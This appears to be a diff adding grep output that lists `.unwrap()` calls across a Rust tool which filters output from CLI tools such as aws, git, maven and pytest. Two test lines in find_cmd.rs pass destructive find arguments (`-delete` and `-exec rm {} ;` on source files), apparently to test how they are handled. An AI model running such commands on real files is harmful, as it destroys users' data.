@@ -1,0 +1,1630 @@
+src/analytics/ccusage.rs:237:        let periods = result.unwrap();
+src/analytics/ccusage.rs:262:        let periods = result.unwrap();
+src/analytics/ccusage.rs:285:        let periods = result.unwrap();
+src/analytics/ccusage.rs:328:        let periods = result.unwrap();
+src/analytics/ccusage.rs:350:        let periods = result.unwrap();
+src/analytics/ccusage.rs:371:        let periods = result.unwrap();
+src/analytics/ccusage.rs:392:        let periods = result.unwrap();
+src/analytics/cc_economics.rs:388:        totals.savings_blended = Some(totals.rtk_saved_tokens as f64 * totals.blended_cpt.unwrap());
+src/analytics/cc_economics.rs:392:        totals.savings_active = Some(totals.rtk_saved_tokens as f64 * totals.active_cpt.unwrap());
+src/analytics/cc_economics.rs:867:        assert_eq!(p.blended_cpt.unwrap(), 100.0 / 1_000_000.0);
+src/analytics/cc_economics.rs:870:        assert_eq!(p.active_cpt.unwrap(), 100.0 / 10_000.0);
+src/analytics/cc_economics.rs:1028:        let cpt = p.weighted_input_cpt.unwrap();
+src/analytics/cc_economics.rs:1032:        let savings = p.savings_weighted.unwrap();
+src/analytics/cc_economics.rs:1069:        let cpt = p.weighted_input_cpt.unwrap();
+src/analytics/cc_economics.rs:1073:        let savings = p.savings_weighted.unwrap();
+src/cmds/cloud/aws_cmd.rs:1327:    LazyLock::new(|| Regex::new(r"^(upload|download|delete|copy|move):").unwrap());
+src/cmds/cloud/aws_cmd.rs:1544:        let result = filter_sts_identity(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:1555:        let result = filter_ec2_instances(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:1573:        let result = filter_sts_identity(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:1583:        let result = filter_sts_identity(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:1640:        let result = filter_ec2_instances(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:1660:        let result = filter_ec2_instances(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:1677:        let result = filter_ecs_list_services(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:1694:        let result = filter_ecs_describe_services(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:1710:        let result = filter_rds_instances(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:1731:        let result = filter_cfn_list_stacks(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:1753:        let result = filter_cfn_describe_stacks(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:1768:        let result = filter_cfn_describe_stacks(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:1811:        let result = filter_ec2_instances(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:1829:        let result = filter_sts_identity(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:1850:        let result = filter_rds_instances(&json).unwrap();
+src/cmds/cloud/aws_cmd.rs:1868:        let result = filter_logs_events(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:1891:        let result = filter_logs_events(&json).unwrap();
+src/cmds/cloud/aws_cmd.rs:1913:        let result = filter_logs_events(&json).unwrap();
+src/cmds/cloud/aws_cmd.rs:1960:        let result = filter_cfn_events(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:1984:        let result = filter_cfn_events(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2005:        let result = filter_lambda_list(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2027:        let result = filter_lambda_list(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2058:        let result = filter_lambda_get(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2086:        let result = filter_lambda_get(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2111:        let result = filter_iam_roles(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2134:        let result = filter_iam_roles(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2153:        let result = filter_iam_users(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2170:        let result = filter_dynamodb_items(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2192:        let result = filter_dynamodb_items(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2210:        let result = filter_dynamodb_items(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2242:        let result = filter_ecs_tasks(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2295:        let result = filter_security_groups(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2315:        let result = filter_security_groups(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2334:        let result = filter_s3_objects(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2355:        let result = filter_eks_cluster(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2378:        let result = filter_sqs_messages(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2421:        let result = filter_dynamodb_get_item(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2454:        let result = filter_logs_query_results(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2464:        let result = filter_logs_query_results(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2515:        let result = filter_secrets_get(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2532:        let result = filter_secrets_get(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2546:        let val: Value = serde_json::from_str(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2552:        let val: Value = serde_json::from_str(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2561:        let val: Value = serde_json::from_str(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2563:        let arr = result.as_array().unwrap();
+src/cmds/cloud/aws_cmd.rs:2582:        let result = filter_dynamodb_items(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2599:        let result = filter_dynamodb_items(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2615:        let result = filter_logs_events(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2627:        let result = filter_lambda_list(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2634:        let result = filter_dynamodb_items(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2645:        let result = filter_security_groups(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2658:        let result = filter_cfn_events(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2677:        let result = filter_lambda_list(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2684:        let result = filter_iam_roles(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2691:        let result = filter_iam_users(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2698:        let result = filter_dynamodb_items(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2705:        let result = filter_ecs_tasks(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2712:        let result = filter_security_groups(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2719:        let result = filter_s3_objects(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2726:        let result = filter_sqs_messages(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2733:        let result = filter_logs_events(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2740:        let result = filter_ec2_instances(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2747:        let result = filter_cfn_events(json).unwrap();
+src/cmds/cloud/aws_cmd.rs:2765:        let result = filter_cfn_events(&json).unwrap();
+src/cmds/cloud/container.rs:906:        let redis_line = lines.iter().find(|l| l.contains("redis")).unwrap();
+src/cmds/cloud/psql_cmd.rs:18:    LazyLock::new(|| Regex::new(r"-\[ RECORD \d+ \]-").unwrap());
+src/cmds/cloud/psql_cmd.rs:19:static SEPARATOR: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^[-+]+$").unwrap());
+src/cmds/cloud/psql_cmd.rs:20:static ROW_COUNT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^\(\d+ rows?\)$").unwrap());
+src/cmds/cloud/psql_cmd.rs:22:    LazyLock::new(|| Regex::new(r"^-\[ RECORD (\d+) \]-").unwrap());
+src/cmds/dotnet/dotnet_cmd.rs:2717:        let sep_pos = injected.iter().position(|a| a == "--").unwrap();
+src/cmds/dotnet/dotnet_cmd.rs:2718:        let trx_pos = injected.iter().position(|a| a == "--report-trx").unwrap();
+src/cmds/dotnet/dotnet_cmd.rs:2755:        let sep_pos = injected.iter().position(|a| a == "--").unwrap();
+src/cmds/git/diff_cmd.rs:19:    LazyLock::new(|| Regex::new(r"^ .+\| *(?:\d+(?: [-+]+)?|Bin\b.*) *$").unwrap());
+src/cmds/git/diff_cmd.rs:32:    LazyLock::new(|| Regex::new(r"^(?:[-+] \S|-+\s*$|--[A-Za-z])").unwrap());
+src/cmds/git/diff_cmd.rs:3478:                Some((s, e)) => (s.parse().unwrap(), e.parse().unwrap()),
+src/cmds/git/diff_cmd.rs:3480:                    let n = spec.parse().unwrap();
+src/cmds/git/diff_cmd.rs:3495:            let (left, right) = header.split_once(op).unwrap();
+src/cmds/git/diff_cmd.rs:3512:                    let anchor: usize = left.parse().unwrap();
+src/cmds/git/diff_cmd.rs:7326:                    let l2: usize = numbers.parse().unwrap();
+src/cmds/git/diff_cmd.rs:7331:                    let l1: usize = numbers.parse().unwrap();
+src/cmds/git/diff_cmd.rs:7336:                    let (old, new) = text.split_once(" → ").unwrap();
+src/cmds/git/diff_cmd.rs:7340:                                (l1.parse().unwrap(), l2.parse().unwrap());
+src/cmds/git/diff_cmd.rs:7347:                            let l1: usize = numbers.parse().unwrap();
+src/cmds/git/gh_cmd.rs:19:static HTML_COMMENT_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?s)<!--.*?-->").unwrap());
+src/cmds/git/gh_cmd.rs:21:    LazyLock::new(|| Regex::new(r"(?m)^\s*\[!\[[^\]]*\]\([^)]*\)\]\([^)]*\)\s*$").unwrap());
+src/cmds/git/gh_cmd.rs:23:    LazyLock::new(|| Regex::new(r"(?m)^\s*!\[[^\]]*\]\([^)]*\)\s*$").unwrap());
+src/cmds/git/gh_cmd.rs:25:    LazyLock::new(|| Regex::new(r"(?m)^\s*(?:---+|\*\*\*+|___+)\s*$").unwrap());
+src/cmds/git/gh_cmd.rs:26:static MULTI_BLANK_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\n{3,}").unwrap());
+src/cmds/git/git_cmd.rs:3468:            let sub = subcommand.unwrap();
+src/cmds/git/git_cmd.rs:3927:            .unwrap()
+src/cmds/git/glab_cmd.rs:26:static HTML_COMMENT_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?s)<!--.*?-->").unwrap());
+src/cmds/git/glab_cmd.rs:28:    LazyLock::new(|| Regex::new(r"(?m)^\s*\[!\[[^\]]*\]\([^)]*\)\]\([^)]*\)\s*$").unwrap());
+src/cmds/git/glab_cmd.rs:30:    LazyLock::new(|| Regex::new(r"(?m)^\s*!\[[^\]]*\]\([^)]*\)\s*$").unwrap());
+src/cmds/git/glab_cmd.rs:32:    LazyLock::new(|| Regex::new(r"(?m)^\s*(?:---+|\*\*\*+|___+)\s*$").unwrap());
+src/cmds/git/glab_cmd.rs:33:static MULTI_BLANK_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\n{3,}").unwrap());
+src/cmds/git/glab_cmd.rs:35:    LazyLock::new(|| Regex::new(r"/-/merge_requests/(\d+)").unwrap());
+src/cmds/git/glab_cmd.rs:38:    Regex::new(r"section_(?:start|end):\d+:[a-z0-9_]+(?:\x1b\[0K|\[0K)*").unwrap()
+src/cmds/git/glab_cmd.rs:41:static BARE_ANSI_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\[[\d;]+[A-Za-z]").unwrap());
+src/cmds/git/gt_cmd.rs:14:    LazyLock::new(|| Regex::new(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b").unwrap());
+src/cmds/git/gt_cmd.rs:19:    .unwrap()
+src/cmds/git/gt_cmd.rs:23:        .unwrap()
+src/cmds/js/next_cmd.rs:48:            .unwrap()
+src/cmds/js/next_cmd.rs:173:        LazyLock::new(|| Regex::new(r"(\d+(?:\.\d+)?)\s*(s|ms)").unwrap());
+src/cmds/js/playwright_cmd.rs:169:        LazyLock::new(|| Regex::new(r"(\d+)\s+(passed|failed|flaky|skipped)").unwrap());
+src/cmds/js/playwright_cmd.rs:171:        LazyLock::new(|| Regex::new(r"\((\d+(?:\.\d+)?)(ms|s|m)\)").unwrap());
+src/cmds/js/playwright_cmd.rs:221:        LazyLock::new(|| Regex::new(r"[×✗]\s+.*?›\s+([^›]+\.spec\.[tj]sx?)").unwrap());
+src/cmds/js/playwright_cmd.rs:374:        let data = result.unwrap();
+src/cmds/js/playwright_cmd.rs:400:        let data = result.unwrap();
+src/cmds/js/playwright_cmd.rs:445:        let data = result.unwrap();
+src/cmds/js/playwright_cmd.rs:459:        let data = result.unwrap();
+src/cmds/js/pnpm_cmd.rs:586:        let data = result.unwrap();
+src/cmds/js/pnpm_cmd.rs:604:        let data = result.unwrap();
+src/cmds/js/pnpm_cmd.rs:698:            .unwrap();
+src/cmds/js/pnpm_cmd.rs:703:            .unwrap();
+src/cmds/js/tsc_cmd.rs:24:    Regex::new(r"^(.+?)\((\d+),(\d+)\):\s+(error|warning)\s+(TS\d+):\s+(.+)$").unwrap()
+src/cmds/js/tsc_cmd.rs:28:    Regex::new(r"^(.+?):(\d+):(\d+)\s+-\s+(error|warning)\s+(TS\d+):\s+(.+)$").unwrap()
+src/cmds/js/tsc_cmd.rs:31:    LazyLock::new(|| Regex::new(r"^(error|warning)\s+(TS\d+):\s+(.+)$").unwrap());
+src/cmds/js/vitest_cmd.rs:120:        LazyLock::new(|| Regex::new(r"Tests\s+(?:(\d+)\s+failed\s+\|\s+)?(\d+)\s+passed").unwrap());
+src/cmds/js/vitest_cmd.rs:122:        LazyLock::new(|| Regex::new(r"Duration\s+([\d.]+)(ms|s)").unwrap());
+src/cmds/js/vitest_cmd.rs:474:        let data = result.unwrap();
+src/cmds/js/vitest_cmd.rs:493:        let data = result.unwrap();
+src/cmds/js/vitest_cmd.rs:526:        let data = result.unwrap();
+src/cmds/js/vitest_cmd.rs:543:        let data = result.unwrap();
+src/cmds/js/vitest_cmd.rs:559:        let data = result.unwrap();
+src/cmds/jvm/gradlew_cmd.rs:14:static TASK_LINE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^> Task :").unwrap());
+src/cmds/jvm/gradlew_cmd.rs:16:    LazyLock::new(|| Regex::new(r"^\* Try:|^> Run with --|^> Get more help at").unwrap());
+src/cmds/jvm/gradlew_cmd.rs:18:    LazyLock::new(|| Regex::new(r"^BUILD (SUCCESSFUL|FAILED)").unwrap());
+src/cmds/jvm/gradlew_cmd.rs:20:    LazyLock::new(|| Regex::new(r"^\d+ actionable tasks?").unwrap());
+src/cmds/jvm/gradlew_cmd.rs:185:        .unwrap()
+src/cmds/jvm/gradlew_cmd.rs:189:                .unwrap()
+src/cmds/jvm/gradlew_cmd.rs:195:        .unwrap()
+src/cmds/jvm/gradlew_cmd.rs:199:        LazyLock::new(|| Regex::new(r"^(w: |warning:|Warning:|WARNING:)").unwrap());
+src/cmds/jvm/gradlew_cmd.rs:201:        LazyLock::new(|| Regex::new(r"gradle\.com/s/|Publishing build scan").unwrap());
+src/cmds/jvm/gradlew_cmd.rs:235:        LazyLock::new(|| Regex::new(r"FAILED$| FAILED ").unwrap());
+src/cmds/jvm/gradlew_cmd.rs:237:        LazyLock::new(|| Regex::new(r" PASSED$| SKIPPED$").unwrap());
+src/cmds/jvm/gradlew_cmd.rs:242:        .unwrap()
+src/cmds/jvm/gradlew_cmd.rs:313:        LazyLock::new(|| Regex::new(r"^INSTRUMENTATION_STATUS[_CODE]*:").unwrap());
+src/cmds/jvm/gradlew_cmd.rs:315:        LazyLock::new(|| Regex::new(r"^INSTRUMENTATION_RESULT:").unwrap());
+src/cmds/jvm/gradlew_cmd.rs:317:        LazyLock::new(|| Regex::new(r"^INSTRUMENTATION_CODE:").unwrap());
+src/cmds/jvm/gradlew_cmd.rs:319:        LazyLock::new(|| Regex::new(r"^Starting \d+ tests? on ").unwrap());
+src/cmds/jvm/gradlew_cmd.rs:321:        LazyLock::new(|| Regex::new(r"^Installing APK").unwrap());
+src/cmds/jvm/gradlew_cmd.rs:364:        LazyLock::new(|| Regex::new(r"[^:]+:\d+:.*[Ee]rror:.*\[").unwrap());
+src/cmds/jvm/gradlew_cmd.rs:367:        LazyLock::new(|| Regex::new(r"[^:]+:\d+:.*[Ww]arning:.*\[").unwrap());
+src/cmds/jvm/gradlew_cmd.rs:370:        LazyLock::new(|| Regex::new(r"[^:]+:\d+:\d+:.*[Ll]int").unwrap());
+src/cmds/jvm/gradlew_cmd.rs:373:        LazyLock::new(|| Regex::new(r"[^:]+:\d+:\d+:.*error").unwrap());
+src/cmds/jvm/gradlew_cmd.rs:376:        LazyLock::new(|| Regex::new(r"\d+ (issues?|errors?|warnings?)").unwrap());
+src/cmds/jvm/gradlew_cmd.rs:379:        Regex::new(r"Wrote (HTML|XML|text) report|file://|/build/reports/lint").unwrap()
+src/cmds/jvm/mvn_cmd.rs:38:static RUNNING: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^\[INFO\] Running ").unwrap());
+src/cmds/jvm/mvn_cmd.rs:49:    LazyLock::new(|| Regex::new(r"^\[INFO\] Running \S+\s*$").unwrap());
+src/cmds/jvm/mvn_cmd.rs:62:    ).unwrap()
+src/cmds/jvm/mvn_cmd.rs:67:    LazyLock::new(|| Regex::new(r"^\[(?:INFO|ERROR)\] BUILD (?:SUCCESS|FAILURE)$").unwrap());
+src/cmds/jvm/mvn_cmd.rs:70:static RESULTS: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^\[INFO\] Results:\s*$").unwrap());
+src/cmds/jvm/mvn_cmd.rs:75:        .unwrap()
+src/cmds/jvm/mvn_cmd.rs:80:    LazyLock::new(|| Regex::new(r"^\[INFO\] --- .* @ .* ---$").unwrap());
+src/cmds/jvm/mvn_cmd.rs:115:        .unwrap()
+src/cmds/jvm/mvn_cmd.rs:129:    LazyLock::new(|| Regex::new(r"^\[INFO\] Building .*\[\d+/\d+\]\s*$").unwrap());
+src/cmds/jvm/mvn_cmd.rs:133:    LazyLock::new(|| Regex::new(r"^\[INFO\] -+< .+ >-+$").unwrap());
+src/cmds/jvm/mvn_cmd.rs:138:    LazyLock::new(|| Regex::new(r"^\[INFO\] Reactor Summary for ").unwrap());
+src/cmds/jvm/mvn_cmd.rs:142:    LazyLock::new(|| Regex::new(r"/[^:]+\.java:\[\d+,\d+\]").unwrap());
+src/cmds/php/artisan_cmd.rs:9:    Regex::new(r"[\u{2500}-\u{257F}\u{2580}-\u{259F}\u{25A0}-\u{25FF}\u{27A0}-\u{27BF}]+").unwrap()
+src/cmds/php/artisan_cmd.rs:11:static DOTS_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\.{3,}").unwrap());
+src/cmds/php/artisan_cmd.rs:12:static MULTI_SPACE_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"[ \t]{2,}").unwrap());
+src/cmds/php/artisan_cmd.rs:13:static MULTI_BLANK_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\n{3,}").unwrap());
+src/cmds/php/phpt_cmd.rs:172:        .unwrap()
+src/cmds/php/phpt_cmd.rs:178:        .unwrap()
+src/cmds/php/phpt_cmd.rs:181:        LazyLock::new(|| Regex::new(r"^\s*Number of tests\s*:\s*(\d+)").unwrap());
+src/cmds/php/phpt_cmd.rs:183:        LazyLock::new(|| Regex::new(r"^\s*Time taken\s*:\s*([0-9.]+)").unwrap());
+src/cmds/php/phpunit_cmd.rs:21:static FAILURE_HEADING_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^\d+\) \S").unwrap());
+src/cmds/php/pint_cmd.rs:183:        let pos_b = result.find("b.php").unwrap();
+src/cmds/php/pint_cmd.rs:184:        let pos_c = result.find("c.php").unwrap();
+src/cmds/php/pint_cmd.rs:185:        let pos_a = result.find("a.php").unwrap();
+src/cmds/php/utils.rs:7:static ANSI_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\x1b\[[0-9;]*[A-Za-z]").unwrap());
+src/cmds/php/utils.rs:9:    LazyLock::new(|| Regex::new(r"[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]").unwrap());
+src/cmds/python/mypy_cmd.rs:59:        Regex::new(r"^(.+?):(\d+)(?::\d+)?: (error|warning|note): (.+?)(?:\s+\[(.+)\])?$").unwrap()
+src/cmds/python/mypy_cmd.rs:242:        let user_pos = result.find("user.py").unwrap();
+src/cmds/python/mypy_cmd.rs:243:        let auth_pos = result.find("auth.py").unwrap();
+src/cmds/python/mypy_cmd.rs:338:        let fileless_pos = result.find("No module named").unwrap();
+src/cmds/python/mypy_cmd.rs:339:        let grouped_pos = result.find("api.py").unwrap();
+src/cmds/python/pip_cmd.rs:187:        let pkgs = by_letter.get(letter).unwrap();
+src/cmds/python/uv_cmd.rs:21:    LazyLock::new(|| Regex::new(r#"^\s*File ".*", line \d+.*$"#).unwrap());
+src/cmds/python/uv_cmd.rs:23:    LazyLock::new(|| Regex::new(r"^\s*[A-Za-z_][A-Za-z0-9_.]*(?:Error|Exception):").unwrap());
+src/cmds/python/uv_cmd.rs:25:    LazyLock::new(|| Regex::new(r"^\s*at .+:\d+:\d+.*$").unwrap());
+src/cmds/python/uv_cmd.rs:28:        Regex::new(r"(?i)\berror\b").unwrap(),
+src/cmds/python/uv_cmd.rs:29:        Regex::new(r"(?i)\bfailed\b").unwrap(),
+src/cmds/python/uv_cmd.rs:30:        Regex::new(r"(?i)\bfailure\b").unwrap(),
+src/cmds/python/uv_cmd.rs:31:        Regex::new(r"(?i)\bexception\b").unwrap(),
+src/cmds/python/uv_cmd.rs:32:        Regex::new(r"(?i)\bpanic\b").unwrap(),
+src/cmds/python/uv_cmd.rs:33:        Regex::new(r"(?i)\bwarn(?:ing)?\b").unwrap(),
+src/cmds/python/uv_cmd.rs:34:        Regex::new(r"(?i)\bassert(?:ion)?\b").unwrap(),
+src/cmds/python/uv_cmd.rs:35:        Regex::new(r"^\s*FAILED\b").unwrap(),
+src/cmds/python/uv_cmd.rs:36:        Regex::new(r"^\s*ERROR\b").unwrap(),
+src/cmds/python/uv_cmd.rs:37:        Regex::new(r"^\s*E\s+").unwrap(),
+src/cmds/python/uv_cmd.rs:38:        Regex::new(r"^\s*Caused by:").unwrap(),
+src/cmds/python/uv_cmd.rs:39:        Regex::new(r"^\s*note:").unwrap(),
+src/cmds/python/uv_cmd.rs:40:        Regex::new(r"^\s*help:").unwrap(),
+src/cmds/ruby/rake_cmd.rs:169:        LazyLock::new(|| regex::Regex::new(r"^\d+\)\s+(Failure|Error):$").unwrap());
+src/cmds/ruby/rspec_cmd.rs:23:    LazyLock::new(|| Regex::new(r"(?i)running via spring preloader").unwrap());
+src/cmds/ruby/rspec_cmd.rs:25:    Regex::new(r"(?i)(coverage report|simplecov|coverage/|\.simplecov|All Files.*Lines)").unwrap()
+src/cmds/ruby/rspec_cmd.rs:28:    LazyLock::new(|| Regex::new(r"^DEPRECATION WARNING:").unwrap());
+src/cmds/ruby/rspec_cmd.rs:29:static RE_FINISHED_IN: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^Finished in \d").unwrap());
+src/cmds/ruby/rspec_cmd.rs:31:    LazyLock::new(|| Regex::new(r"saved screenshot to (.+)").unwrap());
+src/cmds/ruby/rspec_cmd.rs:33:    LazyLock::new(|| Regex::new(r"(\d+) examples?, (\d+) failures?").unwrap());
+src/cmds/ruby/rubocop_cmd.rs:432:        let ctrl_pos = result.find("users_controller.rb").unwrap();
+src/cmds/ruby/rubocop_cmd.rs:433:        let model_pos = result.find("app/models/user.rb").unwrap();
+src/cmds/ruby/rubocop_cmd.rs:440:        let error_pos = result.find(":30 Lint/Syntax").unwrap();
+src/cmds/ruby/rubocop_cmd.rs:441:        let conv_pos = result.find(":5 Layout/TrailingWhitespace").unwrap();
+src/cmds/ruby/rubocop_cmd.rs:452:        let warning_pos = result.find(":25 Lint/UselessAssignment").unwrap();
+src/cmds/ruby/rubocop_cmd.rs:453:        let conv1_pos = result.find(":1 Style/FrozenStringLiteralComment").unwrap();
+src/cmds/rust/cargo_cmd.rs:1063:            ).unwrap()
+src/cmds/scala/sbt_cmd.rs:16:    .unwrap()
+src/cmds/scala/sbt_cmd.rs:24:        .unwrap()
+src/cmds/scala/sbt_cmd.rs:30:    LazyLock::new(|| Regex::new(r"Suites: completed (\d+), aborted (\d+)").unwrap());
+src/cmds/scala/sbt_cmd.rs:34:    LazyLock::new(|| Regex::new(r"Run completed in (\d+) seconds?").unwrap());
+src/cmds/scala/sbt_cmd.rs:38:    LazyLock::new(|| Regex::new(r"\[info\] Compiling (\d+) Scala source").unwrap());
+src/cmds/scala/sbt_cmd.rs:42:    LazyLock::new(|| Regex::new(r"\[success\] Total time: (\d+) s").unwrap());
+src/cmds/scala/sbt_cmd.rs:45:static ERROR_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^\[error\]").unwrap());
+src/cmds/scala/sbt_cmd.rs:51:    ).unwrap()
+src/cmds/system/ast_grep_cmd.rs:20:    regex::Regex::new(r"^(?P<file>[^:]+):(?P<line>\d+):(?P<content>.*)$").unwrap()
+src/cmds/system/ast_grep_cmd.rs:203:        let file = caps.name("file").unwrap().as_str();
+src/cmds/system/ast_grep_cmd.rs:204:        let line_num: usize = caps.name("line").unwrap().as_str().parse().unwrap_or(0);
+src/cmds/system/ast_grep_cmd.rs:205:        let content = caps.name("content").unwrap().as_str();
+src/cmds/system/ast_grep_cmd.rs:388:2 │     let x = foo().unwrap();
+src/cmds/system/deps.rs:87:        Regex::new(r#"^([a-zA-Z0-9_-]+)\s*=\s*(?:"([^"]+)"|.*version\s*=\s*"([^"]+)")"#).unwrap();
+src/cmds/system/deps.rs:88:    let section_re = Regex::new(r"^\[([^\]]+)\]").unwrap();
+src/cmds/system/deps.rs:184:    let dep_re = Regex::new(r"^([a-zA-Z0-9_-]+)([=<>!~]+.*)?$").unwrap();
+src/cmds/system/deps.rs:316:        assert_eq!(out, summarize(PACKAGE_JSON).unwrap());
+src/cmds/system/find_cmd.rs:803:        match dispatch(&args(&["*.rs", "src", "-delete", "-m", "1"])).unwrap() {
+src/cmds/system/find_cmd.rs:812:        .unwrap()
+src/cmds/system/find_cmd.rs:823:            let p = parse_find_args(&args(a)).unwrap();
+src/cmds/system/find_cmd.rs:831:        let p = parse_find_args(&args(&["Cargo.toml"])).unwrap();
+src/cmds/system/find_cmd.rs:834:        let p = parse_find_args(&args(&["no_such_dir_xyz"])).unwrap();
+src/cmds/system/find_cmd.rs:836:        let p = parse_find_args(&args(&["README.md", "src"])).unwrap();
+src/cmds/system/find_cmd.rs:843:        let p = parse_find_args(&args(&["*.rs", "src", "-m", "5"])).unwrap();
+src/cmds/system/find_cmd.rs:852:        match dispatch(&args(&["*.rs", "src", "-mtime", "+7", "-m", "5"])).unwrap() {
+src/cmds/system/find_cmd.rs:862:        match dispatch(&args(&["*.rs", "-exec", "rm", "{}", ";"])).unwrap() {
+src/cmds/system/find_cmd.rs:884:        match dispatch(&args(&[".", "-mtime", "-7", "-m", "5"])).unwrap() {
+src/cmds/system/find_cmd.rs:946:        match dispatch(&args(&[".", "-m", "5", "-mtime", "-7"])).unwrap() {
+src/cmds/system/find_cmd.rs:965:            match dispatch(&args(a)).unwrap() {
+src/cmds/system/find_cmd.rs:1002:        .unwrap();
+src/cmds/system/find_cmd.rs:1021:        let root = tempfile::TempDir::new().unwrap();
+src/cmds/system/find_cmd.rs:1023:        std::fs::create_dir_all(&dir).unwrap();
+src/cmds/system/find_cmd.rs:1024:        std::fs::write(dir.join("f.txt"), "").unwrap();
+src/cmds/system/find_cmd.rs:1028:            root.path().to_str().unwrap(),
+src/cmds/system/find_cmd.rs:1088:        let parsed = parse_find_args(&args(&[".", "-name", "*.rs"])).unwrap();
+src/cmds/system/find_cmd.rs:1097:        let parsed = parse_find_args(&args(&["src", "-name", "*.rs", "-type", "f"])).unwrap();
+src/cmds/system/find_cmd.rs:1105:        let parsed = parse_find_args(&args(&[".", "-type", "d"])).unwrap();
+src/cmds/system/find_cmd.rs:1112:        let parsed = parse_find_args(&args(&[".", "-name", "*.toml", "-maxdepth", "2"])).unwrap();
+src/cmds/system/find_cmd.rs:1120:        let parsed = parse_find_args(&args(&[".", "-iname", "Makefile"])).unwrap();
+src/cmds/system/find_cmd.rs:1127:        let parsed = parse_find_args(&args(&[".", "-name", "*.rs"])).unwrap();
+src/cmds/system/find_cmd.rs:1134:        let parsed = parse_find_args(&args(&["-name", "*.rs"])).unwrap();
+src/cmds/system/find_cmd.rs:1161:        let parsed = parse_find_args(&args(&["*.rs"])).unwrap();
+src/cmds/system/find_cmd.rs:1168:        let parsed = parse_find_args(&args(&["*.rs", "src"])).unwrap();
+src/cmds/system/find_cmd.rs:1175:        let parsed = parse_find_args(&args(&["*.rs", "src", "-m", "10", "-t", "d"])).unwrap();
+src/cmds/system/find_cmd.rs:1184:        let parsed = parse_find_args(&args(&[])).unwrap();
+src/cmds/system/find_cmd.rs:1269:        let parsed = parse_find_args(&args(&["*.rs", "-m", "10"])).unwrap();
+src/cmds/system/find_cmd.rs:1271:        let parsed = parse_find_args(&args(&["*.rs", "--max", "10"])).unwrap();
+src/cmds/system/find_cmd.rs:1277:        let parsed = parse_find_args(&args(&[".", "-name", "*.rs", "-type", "f"])).unwrap();
+src/cmds/system/find_cmd.rs:1283:        let parsed = parse_find_args(&args(&[])).unwrap();
+src/cmds/system/find_cmd.rs:1285:        let parsed = parse_find_args(&args(&["*.rs", "src"])).unwrap();
+src/cmds/system/find_cmd.rs:1307:        assert_eq!(hidden.first().unwrap(), "logs-old/f21.txt");
